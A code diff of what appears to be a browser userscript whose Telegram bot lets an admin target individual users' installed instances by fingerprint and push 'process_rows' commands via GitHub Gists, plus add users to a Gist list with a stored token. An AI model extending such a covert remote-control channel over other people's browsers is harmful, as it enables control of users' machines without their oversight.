@@ -201,6 +201,11 @@
 					break;
 				case 'process_rows':
 					if (window.promptManager) {
+						if (command.sheetName) {
+							const state = StateManager.getState();
+							state.sheetName = command.sheetName;
+							StateManager.setState(state);
+						}
 						await window.promptManager.processRowInput(command.payload);
 					}
 					break;
@@ -769,6 +774,7 @@
 			this.isPolling = false;
 			this.startTime = Math.floor(Date.now() / 1000);
 			this.targetUser = null;
+			this.conversationState = {}; // Stores state for interactive commands
 			this.remoteControl = null;
 
 			this.initializeRemoteControl();
@@ -834,10 +840,83 @@
 				// Ignore old messages
 				if (update.message.date < this.startTime) continue;
 
+				// Handle active conversations (interactive commands)
+				if (this.conversationState[update.message.chat.id]) {
+					await this.handleConversation(update.message.chat.id, update.message.text);
+					continue;
+				}
+
 				const text = update.message.text.trim();
 				if (text.startsWith('/')) {
 					await this.executeCommand(text, update.message.chat.id);
 				}
+			}
+		}
+
+		async handleConversation(chatId, text) {
+			const state = this.conversationState[chatId];
+			if (!state) return;
+
+			try {
+				switch (state.step) {
+					case 'SELECT_USER':
+						state.targetUser = text.trim();
+						state.step = 'SELECT_SHEET';
+						await this.sendMessage(chatId, `👤 Target: <code>${state.targetUser}</code>\n\n📄 <b>Step 2/3: Select Sheet</b>\nReply with the sheet name (e.g., <code>Sheet1</code>).`);
+						break;
+
+					case 'SELECT_SHEET':
+						state.sheetName = text.trim();
+						state.step = 'ENTER_ROWS';
+						await this.sendMessage(chatId, `📄 Sheet: <b>${state.sheetName}</b>\n\n🔢 <b>Step 3/3: Enter Rows</b>\nReply with row numbers (e.g., <code>150-160</code>) or IDs.`);
+						break;
+
+					case 'ENTER_ROWS':
+						const rows = text.trim();
+						await this.sendMessage(chatId, `🚀 <b>Sending Command...</b>\nUser: ${state.targetUser}\nSheet: ${state.sheetName}\nRows: ${rows}`);
+						
+						if (this.remoteControl) {
+							await this.remoteControl.postCommand({
+								action: 'process_rows',
+								target: state.targetUser,
+								sheetName: state.sheetName,
+								payload: rows
+							});
+							await this.sendMessage(chatId, `✅ <b>Command Sent Successfully!</b>`);
+						} else {
+							await this.sendMessage(chatId, `❌ Remote control not initialized.`);
+						}
+						
+						// Clear state
+						delete this.conversationState[chatId];
+						break;
+				}
+			} catch (error) {
+				await this.sendMessage(chatId, `❌ Error: ${error.message}\nConversation cancelled.`);
+				delete this.conversationState[chatId];
+			}
+		}
+
+		async addUserToGist(userId) {
+			const pat = GM_getValue('GITHUB_PAT', null);
+			if (!pat || !this.gistIds?.users) return '❌ Missing PAT or Users Gist ID.';
+
+			try {
+				const usersData = await window.gistController.fetchGist(GIST_CONTROL.USERS_URL) || { users: [] };
+				if (usersData.users.some(u => u.fingerprint === userId)) return '⚠️ User already exists.';
+
+				usersData.users.push({ fingerprint: userId, added_by: 'admin', date: new Date().toISOString() });
+				
+				// Re-use RemoteControlManager's update logic logic manually since it's a different gist
+				// Ideally we'd move updateGist to a utility, but for now we instantiate a temp manager or just use fetch
+				// Let's use the existing remoteControl instance but swap the ID temporarily or just use a raw request
+				// For simplicity, let's just use the RemoteControlManager class logic:
+				const tempManager = new RemoteControlManager(this.gistIds.users, pat);
+				// We need to overwrite the whole file content
+				await tempManager.updateGist(JSON.stringify(usersData, null, 2));
+				return `✅ User <code>${userId}</code> added to list.`;
+			} catch (e) {
+				return `❌ Failed to add user: ${e.message}`;
 			}
 		}
 
@@ -906,6 +985,7 @@
 								`<b>Remote Admin Commands:</b>\n` +
 								`  /list_users - List known user IDs\n` +
 								`  /report_all - Force all users to report status\n` +
+								`  /add_user &lt;id&gt; - Add user to known list\n` +
 								`  /broadcast &lt;msg&gt; - Send message to all\n` +
 								`  /target &lt;user_id&gt; - Select user to control\n\n` +
 								`<b>Targeted Commands (requires /target):</b>\n` +
@@ -959,6 +1039,16 @@
 						reply = `📢 Broadcast sent to all users.`;
 						break;
 
+					case '/add_user':
+						if (args.length > 0) {
+							reply = '⏳ Adding user...';
+							await this.sendMessage(chatId, reply);
+							reply = await this.addUserToGist(args[0]);
+						} else {
+							reply = 'Usage: /add_user <ULTRA-ID>';
+						}
+						break;
+
 					case '/list_users':
 						const usersData = await window.gistController.fetchGist(GIST_CONTROL.USERS_URL);
 						if (usersData && usersData.users) {
@@ -970,25 +1060,23 @@
 						break;
 
 					case '/exec':
-						if (!this.remoteControl) throw new Error('Remote control not configured.');
-						if (!this.targetUser) throw new Error('No user targeted. Use /target <user_id> first.');
-
-						const remoteAction = args.shift();
-						const payload = args.join(' ');
-						let remoteCommand = { action: remoteAction, target: this.targetUser };
-
-						// Customize payload based on action
-						if (remoteAction === 'start_prompt') {
-							remoteCommand.sheetName = payload;
-						} else if (remoteAction === 'process_rows') {
-							remoteCommand.payload = payload;
-						} else {
-							remoteCommand.payload = payload;
+						if (!this.remoteControl) {
+							reply = '❌ Remote control not configured.';
+							break;
 						}
-
-						await this.remoteControl.postCommand(remoteCommand);
-						reply = `🚀 Command '<code>${remoteAction}</code>' sent to <code>${this.targetUser}</code>.`;
+						// Start interactive mode
+						this.conversationState[chatId] = { step: 'SELECT_USER' };
+						
+						// Fetch users for display
+						const knownUsers = await window.gistController.fetchGist(GIST_CONTROL.USERS_URL);
+						let userMenu = "No known users.";
+						if (knownUsers && knownUsers.users) {
+							userMenu = knownUsers.users.map(u => `• <code>${u.fingerprint}</code>`).join('\n');
+						}
+						
+						reply = `👥 <b>Step 1/3: Select User</b>\n\n${userMenu}\n\nReply with the <b>User ID</b> you want to control.`;
 						break;
+
 					default:
 						reply = `❓ Unknown command: ${command}`;
 				}
